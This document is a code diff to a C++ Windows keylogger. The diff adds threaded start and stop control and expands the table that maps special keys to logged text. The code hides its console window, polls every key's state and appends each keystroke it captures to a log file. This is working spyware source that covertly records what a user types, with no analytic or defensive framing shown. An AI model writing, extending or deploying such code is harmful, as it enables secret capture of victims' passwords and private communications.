@@ -1,8 +1,27 @@
 #include "Keylogger.hpp"
 
+Keylogger::~Keylogger() {
+    if (keyloggerThread.joinable())
+        keyloggerThread.join();
+}
+
+void Keylogger::start(const std::string &filePath)
+{
+    logFilePath = filePath;
+    if (running) return;
+    running = true;
+    keyloggerThread = std::thread(&Keylogger::captureKey, this);
+}
+
+void Keylogger::stop() {
+    if (!running) return;
+    running = false;
+    if (keyloggerThread.joinable())
+        keyloggerThread.join();
+}
+
 void Keylogger::captureKey() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    running = true;
     while (running) {
         for (int KEY = 8; KEY <= 190; KEY++) {
             if (GetAsyncKeyState(KEY) == -32767) {
@@ -14,35 +33,22 @@ void Keylogger::captureKey() {
     }
 }
 
-void Keylogger::setPath(const std::string &filePath)
-{
-    logFilename = filePath;
-}
-
 void Keylogger::log(const std::string &input) {
     std::fstream logFile;
-    logFile.open(logFilename, std::fstream::app);
+    logFile.open(logFilePath, std::fstream::app);
     if (logFile.is_open()) {
         logFile << input;
         logFile.close();
     } else {
-       std::cerr << "Can't open file with path: " << logFilename << '\n'; 
+       std::cerr << "Can't open file with path: " << logFilePath << '\n'; 
        exit(1);
     }
 }
 
-void Keylogger::stop()
-{
-    running = false;
-}
-
-
-bool Keylogger::logSpecialKey(int key)
-{
+bool Keylogger::logSpecialKey(int key) {
     switch (key) {
         case VK_SPACE: log(" "); return true;
         case VK_RETURN: log("[ENTER]"); return true;
-        case VK_OEM_PERIOD: log("."); return true;
         case VK_SHIFT: log("[SHIFT]"); return true;
         case VK_BACK: log("[BACK_SPACE]"); return true;
         case VK_RBUTTON: log("[R_CLICK]"); return true;
@@ -56,9 +62,14 @@ bool Keylogger::logSpecialKey(int key)
         case VK_MENU: log("[ALT]"); return true;
         case VK_LWIN: log("[WIN_KEY]"); return true;
         case VK_OEM_COMMA: log(","); return true;
+        case VK_OEM_PERIOD: log("."); return true;
         case VK_OEM_1: log(";"); return true;
-        case VK_OEM_7: log("'"); return true;
+        case VK_OEM_2: log("/"); return true;
         case VK_OEM_3: log("`"); return true;
+        case VK_OEM_4: log("["); return true;
+        case VK_OEM_5: log("\\"); return true;
+        case VK_OEM_6: log("]"); return true;
+        case VK_OEM_7: log("'"); return true;
         case VK_F1: log("[F1]"); return true;
         case VK_F2: log("[F2]"); return true;
         case VK_F3: log("[F3]"); return true;
